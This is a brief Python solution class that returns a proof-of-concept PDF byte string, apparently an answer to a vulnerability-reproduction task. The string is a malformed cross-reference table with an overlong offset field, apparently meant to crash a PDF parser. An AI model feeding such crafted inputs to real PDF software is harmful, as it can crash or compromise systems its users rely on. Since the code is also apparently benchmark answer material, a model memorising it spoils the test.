class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = b'%PDF-1.0\nxref\n0 1\n' + b'0' * 20 + b' 00000 f\r\n'
        return poc